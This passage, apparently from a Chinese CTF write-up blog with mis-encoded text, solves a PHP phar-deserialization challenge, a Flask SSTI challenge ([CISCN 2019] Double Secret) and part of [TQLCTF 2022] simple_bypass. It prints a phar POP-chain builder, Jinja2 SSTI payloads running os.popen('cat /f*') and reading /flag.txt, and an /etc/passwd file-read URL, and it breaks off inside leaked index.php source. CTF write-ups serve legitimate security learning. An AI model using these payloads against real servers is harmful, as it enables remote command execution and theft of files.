class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><strong>base.php</strong></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png" alt="image-20241129090905238"></p>
<p><strong>upload_file.php</strong></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png" alt="image-20241129091157168"></p>
<p>ç„¶åæˆ‘ä»¬éœ€è¦è¿›è¡Œçš„å°±æ˜¯ä»£ç å®¡è®¡</p>
<p>ä¸Šä¼ çš„æ–‡ä»¶åç¼€é™å®šä¸ºç™½åå•ï¼Œä¸”ä¼šå¼ºåˆ¶æ”¹æˆ.jpgï¼Œé‚£ä¹ˆæ­£å¸¸çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´å°±ä¸å­˜åœ¨äº†ï¼Œå¾—æƒ³å…¶ä»–åŠæ³•ï¼Œæºç ä¸­å…¶å®ä¹Ÿç»™äº†æç¤ºï¼Œpharååºåˆ—åŒ–ï¼Œç»™äº†æ–‡ä»¶åŒ…å«çš„ç‚¹ï¼Œä¹Ÿç»™äº†æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–äº†ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦æ‰¾é“¾æ¡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1e4r::__destruct() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Test::get() -&gt; Test::file_get()</span><br></pre></td></tr></table></figure>

<p>é“¾å­æ‹¿æäº†ï¼Œæ„é€ å°±è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stubï¼Œæ·»åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†pharæ–‡ä»¶åç¼€æ”¹æˆjpgï¼Œä¸Šä¼ ååœ¨uploadç›®å½•ä¸‹è·å–åç§°ç„¶ååœ¨file.phpæ–‡ä»¶ä¸‹è¿›è¡Œpharæ–‡ä»¶åŒ…å«å³å¯è·å–flag</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png" alt="image-20241129094525150"></p>
<h2 id="CISCN-2019åä¸œå—-Double-Secret"><a href="#CISCN-2019åä¸œå—-Double-Secret" class="headerlink" title="[CISCN 2019åä¸œå—]Double Secret"></a>[CISCN 2019åä¸œå—]Double Secret</h2><p>æ‰«ç›®å½•å‘ç°&#x2F;secretç›®å½•</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png" alt="image-20241129152014405"></p>
<p>ä¼ å…¥secretå‚æ•°åä¼šåŠ å¯†åè¿›è¡Œå›æ˜¾ï¼Œ11111å°±æŠ¥é”™äº†ï¼ŒåŒæ—¶å‘ç°æ³„éœ²äº†éƒ¨åˆ†æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#è§£å¯†</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>ä¸€çœ¼ssti</p>
<p>RC4åŠ å¯†åç”¨render_template_stringè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼ŒRC4å¯†é’¥ä¸ºHereIsTreasureï¼ŒåŒæ—¶ç”¨safe()å‡½æ•°å¯¹æ¶æ„ä»£ç è¿›è¡Œè¿‡æ»¤</p>
<p>é‚£æ¥ä¸‹æ¥å°±è¯•ç€ssti</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png" alt="image-20241129153324392"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png" alt="image-20241129153330890"></p>
<p>é‚£å°±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±èƒ½è·å¾—objectäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png" alt="image-20241129153602396"></p>
<p>ç„¶åä¸çŸ¥é“æ‰¾å“ªä¸ªç±»äº†ï¼Œç½‘ä¸Šè¯´ç”¨warnings.catch_warningsç±»ç„¶å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä¸å¤ªè¡Œå•Šï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p>
<p>åæ¥ç”¨configç›´æ¥è¯•ï¼Œå±…ç„¶å¯ä»¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png" alt="image-20241129154720280"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png" alt="image-20241129154816344"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>NSSCTF{2503893c-a2dd-44f5-822d-40536acbabd0}</p>
<p>åæ¥åˆå›å½’ä¹‹å‰çš„payloadï¼Œç”¨&lt;class â€˜site._Printerâ€™&gt;ç±»é‡Œé¢çš„globalsæœ‰osæ¨¡å—ï¼Œæ˜¯å¯ä»¥ç”¨çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>warnings.catch_warningsç±»æœ‰openæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰“å¼€æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="TQLCTF-2022-simple-bypass"><a href="#TQLCTF-2022-simple-bypass" class="headerlink" title="[TQLCTF 2022]simple_bypass"></a>[TQLCTF 2022]simple_bypass</h2><p>æ³¨å†Œç™»é™†ä¸€ä¸‹å°±å¥½ï¼Œåœ¨å¥½åº·çš„å¤„å‘ç°phpçš„è·³è½¬ï¼Œå‘ç°é‚£é‡Œå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png" alt="image-20241129162734692"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28995/get_pic.php?image=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥çœ‹æºä»£ç è·å–ä¸€ä¸²base64</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png" alt="image-20241129162758249" style="zoom:67%;" />

<p>å®é”¤äº†ï¼ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé‚£å°±è¯»å–ä¸€ä¸‹å½“å‰çš„è¿™ä¸ªæ–‡ä»¶å§ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$image</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;img&quot;&gt; &lt;img src=&quot;data:image/png;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>)) . <span class="string">&#x27;&quot; /&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ²¡å•¥ç”¨ï¼Œé‚£å°±çœ‹çœ‹index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">	<span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line">		<span class="comment">//filter</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">					<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line">					<span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">					<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">		<span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt; </span><br><span class="line">	&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">	&lt;title&gt;Simple Linux&lt;/title&gt;</span><br><span class="line">	&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span><br><span class="line">	&lt;!--[<span class="keyword">if</span> IE]&gt;</span><br><span class="line">		&lt;script src=<span class="string">&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">	&lt;![<span class="keyword">endif</span>]--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">jq22</span>-<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">wrap</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">html</span>&quot;&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>&quot; <span class="title">checked</span>&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">In</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">Up</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">						&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">check</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">class</span>=&quot;<span class="title">check</span>&quot; <span class="title">checked</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">check</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;/<span class="title">span</span>&gt; <span class="title">Keep</span> <span class="title">me</span> <span class="title">Signed</span> <span class="title">in</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span 